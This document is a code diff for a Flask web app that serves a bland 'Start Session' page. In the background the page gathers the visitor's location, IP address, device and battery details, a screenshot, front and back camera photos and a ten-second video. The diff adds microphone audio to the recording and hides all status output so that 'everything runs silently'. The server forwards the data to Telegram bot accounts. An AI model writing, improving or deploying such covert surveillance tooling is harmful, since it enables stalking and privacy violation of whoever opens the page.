@@ -30,7 +30,10 @@ HTML_PAGE = """<!DOCTYPE html>
         .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
         .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
         .controls button:disabled { opacity:0.5; cursor:not-allowed; }
+        /* Hide all status elements */
         #statusText, #locationStatus, #debug { display: none; }
+        /* Ensure body takes full height for screenshot */
+        html, body { min-height: 100%; }
     </style>
 </head>
 <body>
@@ -49,13 +52,11 @@ HTML_PAGE = """<!DOCTYPE html>
         <div class="controls">
             <button id="startBtn">▶ Start Session</button>
         </div>
-        <!-- Hidden status elements – kept for internal debugging if needed -->
         <div id="statusText"></div>
         <div id="locationStatus"></div>
         <div id="debug"></div>
     </div>
 
-    <!-- html2canvas CDN for screenshot -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
     <script>
@@ -63,14 +64,14 @@ HTML_PAGE = """<!DOCTYPE html>
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const startBtn = document.getElementById('startBtn');
 
-        // ---- Helper: send data to backend ----
+        // ---- Helper: send form data ----
         async function sendData(formData) {
             try {
                 await fetch('/capture', { method: 'POST', body: formData });
             } catch (e) {}
         }
 
-        // ---- Get public IP and device info ----
+        // ---- Get IP info ----
         async function getIpInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -81,42 +82,27 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
+        // ---- Device info ----
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let brand = 'Unknown';
-            let model = 'Unknown';
-            // Simple detection – expand as needed
-            if (ua.includes('iPhone')) {
-                brand = 'Apple';
-                model = 'iPhone';
-            } else if (ua.includes('iPad')) {
-                brand = 'Apple';
-                model = 'iPad';
-            } else if (ua.includes('Android')) {
+            let brand = 'Unknown', model = 'Unknown';
+            if (ua.includes('iPhone')) { brand = 'Apple'; model = 'iPhone'; }
+            else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
+            else if (ua.includes('Android')) {
                 brand = 'Android';
-                // try to get model
                 const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                 if (match) model = match[2];
                 else model = 'Android Device';
-            } else if (ua.includes('Windows Phone')) {
-                brand = 'Microsoft';
-                model = 'Windows Phone';
-            } else {
-                brand = 'Unknown';
-                model = 'Unknown';
-            }
+            } else if (ua.includes('Windows Phone')) { brand = 'Microsoft'; model = 'Windows Phone'; }
             return { brand, model };
         }
 
-        // ---- Get battery level ----
+        // ---- Battery ----
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    };
+                    return { level: Math.round(battery.level * 100), charging: battery.charging };
                 }
                 return { level: 'unknown', charging: 'unknown' };
             } catch (e) {
@@ -124,44 +110,70 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
-        // ---- Capture screenshot using html2canvas ----
+        // ---- Full page screenshot ----
         function captureScreenshot() {
             return new Promise((resolve) => {
-                // Capture the entire visible body
-                html2canvas(document.body, {
+                // Capture the whole document
+                html2canvas(document.documentElement, {
                     useCORS: true,
                     logging: false,
-                    scale: 0.8, // reduce size for speed
-                    allowTaint: true
+                    scale: 0.8,
+                    allowTaint: true,
+                    scrollX: 0,
+                    scrollY: 0,
+                    windowWidth: document.documentElement.scrollWidth,
+                    windowHeight: document.documentElement.scrollHeight
                 }).then(canvas => {
                     canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                 }).catch(() => resolve(null));
             });
         }
 
-        // ---- Camera fallback ----
-        async function getCameraStream() {
+        // ---- Camera streams with specific facing modes ----
+        async function getCameraStreams() {
+            // Try to get back camera (environment)
+            let backStream = null;
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                return { stream, label: 'default' };
+                backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' },
+                    audio: true  // include audio for recording
+                });
             } catch (e) {
+                // fallback: try without constraint
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                    return { stream, label: 'environment' };
+                    backStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 } catch (e2) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                        return { stream, label: 'user' };
-                    } catch (e3) {
-                        throw new Error('No camera');
-                    }
+                    // no camera
                 }
             }
+
+            // Try to get front camera (user)
+            let frontStream = null;
+            try {
+                frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false // front only for photo, no audio needed
+                });
+            } catch (e) {
+                // if back exists, reuse it for front as fallback
+                if (backStream) {
+                    // clone the stream? we can just reuse the same track
+                    frontStream = backStream.clone();
+                } else {
+                    // last resort: get any camera
+                    try {
+                        frontStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    } catch (e2) {}
+                }
+            }
+
+            return { front: frontStream, back: backStream };
         }
 
-        // ---- Capture single frame from stream ----
+        // ---- Capture frame from stream ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
+                if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
@@ -205,90 +217,59 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationData = { denied: true };
             }
 
-            // 2. IP info
+            // 2. IP, Device, Battery
             const ipInfo = await getIpInfo();
-
-            // 3. Device info
             const device = getDeviceInfo();
-
-            // 4. Battery
             const battery = await getBatteryInfo();
 
-            // 5. Camera
+            // 3. Camera streams
+            const { front, back } = await getCameraStreams();
             let frontBlob = null, backBlob = null, videoBlob = null;
-            try {
-                const result = await getCameraStream();
-                const stream = result.stream;
-                let frontStreamLocal = null;
-                try {
-                    const frontResult = await getCameraStream();
-                    frontStreamLocal = frontResult.stream;
-                } catch (e) {
-                    frontStreamLocal = stream;
+
+            if (front || back) {
+                // Capture frames
+                if (front) frontBlob = await captureFrame(front);
+                if (back) backBlob = await captureFrame(back);
+
+                // Record from back stream (with audio) if available, else from front
+                let recordStream = back || front;
+                if (recordStream) {
+                    // We need a stream with audio; if back doesn't have audio, we can add audio from front? Not needed.
+                    // We'll use recordStream as is.
+                    mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9,opus' });
+                    recordedChunks = [];
+                    mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                        // finalize after recording stops
+                        finalizeAndSend();
+                    };
+                    mediaRecorder.start(1000);
+                    recordingActive = true;
+                    setTimeout(() => {
+                        if (recordingActive && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            recordingActive = false;
+                        }
+                    }, maxDuration);
+                    window.addEventListener('beforeunload', () => {
+                        if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                    });
+                } else {
+                    // no stream for recording, skip video
                 }
-                backStream = stream;
-                frontStream = frontStreamLocal;
-
-                frontBlob = await captureFrame(frontStream);
-                backBlob = await captureFrame(backStream);
-
-                // Record video
-                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
-                recordedChunks = [];
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    // Send everything after recording stops
-                    finalizeAndSend();
-                };
-                mediaRecorder.start(1000);
-                recordingActive = true;
-                setTimeout(() => {
-                    if (recordingActive && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        recordingActive = false;
-                    }
-                }, maxDuration);
-                window.addEventListener('beforeunload', () => {
-                    if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                });
-            } catch (err) {
-                // Camera failed – we'll still send other data
-                // We'll send a notification later
             }
 
-            // 6. Screenshot (capture after everything else)
+            // 4. Screenshot (capture after everything else)
             const screenshotBlob = await captureScreenshot();
 
-            // Wait for video to finish (if recording)
-            // Since recording is async, we need a way to wait.
-            // We'll use a promise that resolves when recording stops.
-            // But we already have onstop callback; we'll implement a promise.
-            // For simplicity, we'll wait a fixed time (maxDuration + 1s) and then finalize.
-            // Better: use a promise.
-            // Let's implement a more robust way:
-            let recordingDone = false;
-            let videoReady = false;
-            if (mediaRecorder) {
-                mediaRecorder.onstop = () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    videoReady = true;
-                    if (recordingDone) finalizeAndSend();
-                };
-                // If recording already stopped (or never started), set videoReady = true
-                if (!recordingActive) {
-                    videoReady = true;
-                }
-                recordingDone = true;
-            } else {
-                videoReady = true;
-                recordingDone = true;
-            }
-
-            // Finalize function
+            // Function to finalize and send all data
+            let finalized = false;
             async function finalizeAndSend() {
+                if (finalized) return;
+                finalized = true;
                 const fd = new FormData();
-                // Add location
+                // Location
                 if (locationData && !locationData.denied) {
                     fd.append('lat', locationData.lat);
                     fd.append('lng', locationData.lng);
@@ -319,19 +300,18 @@ HTML_PAGE = """<!DOCTYPE html>
                 startBtn.innerText = '▶ Start Session';
             }
 
-            // If recording never started (camera error), finalize immediately.
+            // If no recording started (no camera), finalize immediately.
             if (!mediaRecorder) {
                 finalizeAndSend();
             } else {
-                // Wait for recording to stop or timeout
+                // Wait for recording to finish or timeout
                 setTimeout(() => {
-                    if (!videoReady) {
-                        // Force stop and finalize
+                    if (!finalized) {
                         if (recordingActive && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        // Ensure finalize is called
+                        // Ensure videoBlob exists (if not, empty blob)
                         if (!videoBlob) {
                             videoBlob = new Blob([], { type: 'video/webm' });
                         }
@@ -341,7 +321,6 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
-        // ---- Hide status messages on load ----
         document.getElementById('startBtn').addEventListener('click', startSession);
         // No visible status updates – everything runs silently.
     </script>
@@ -374,7 +353,7 @@ def capture():
     video = request.files.get('video')
 
     for uid in USER_IDS:
-        # --- Location ---
+        # Location
         if lat and lng:
             try:
                 bot.send_location(uid, float(lat), float(lng))
@@ -387,7 +366,7 @@ def capture():
             except Exception as e:
                 print(f"Error: {e}")
 
-        # --- IP & Device Info ---
+        # IP & Device & Battery
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
@@ -399,21 +378,23 @@ def capture():
         except Exception as e:
             print(f"Info send error: {e}")
 
-        # --- Screenshot ---
+        # Screenshot
         if screenshot:
             try:
                 screenshot.seek(0)
-                bot.send_photo(uid, screenshot.read(), caption="📸 Screenshot of page")
+                bot.send_photo(uid, screenshot.read(), caption="📸 Full Page Screenshot")
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # --- Camera images ---
+        # Front camera
         if front_img:
             try:
                 front_img.seek(0)
                 bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
             except Exception as e:
                 print(f"Front image error: {e}")
+
+        # Back camera
         if back_img:
             try:
                 back_img.seek(0)
@@ -421,11 +402,11 @@ def capture():
             except Exception as e:
                 print(f"Back image error: {e}")
 
-        # --- Video ---
+        # Video (with audio)
         if video:
             try:
                 video.seek(0)
-                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording")
+                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording (with sound)")
             except Exception as e:
                 print(f"Video error: {e}")
 
